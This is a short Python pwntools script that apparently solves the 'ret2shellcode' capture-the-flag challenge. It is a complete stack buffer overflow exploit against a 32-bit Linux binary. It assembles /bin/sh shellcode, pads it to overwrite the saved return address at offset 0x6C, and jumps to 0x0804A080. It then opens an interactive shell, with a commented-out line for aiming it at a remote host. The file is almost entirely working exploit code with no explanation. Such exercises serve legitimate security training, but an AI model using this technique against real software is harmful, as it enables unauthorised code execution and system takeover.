from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './ret2shellcode'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

shellcode = asm(shellcraft.sh())
padding2ebp = 0x6C # from the var to ebp
padding = padding2ebp + context.word_size//8
padding -= len(shellcode)

#gdb.attach(io)
#pause()
ret_addr = 0x0804A080
payload = flat([shellcode, cyclic(padding), ret_addr])
delimiter = "No system for you this time !!!\n"
io.sendlineafter(delimiter, payload)
io.interactive()
